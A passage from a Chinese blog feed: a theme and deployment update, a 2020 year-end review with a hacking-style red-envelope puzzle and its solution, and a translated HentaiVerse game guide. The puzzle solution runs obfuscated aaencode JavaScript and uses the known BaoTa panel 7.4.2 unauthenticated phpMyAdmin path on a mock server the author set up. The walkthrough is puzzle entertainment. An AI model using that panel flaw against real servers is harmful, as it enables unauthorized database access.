href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 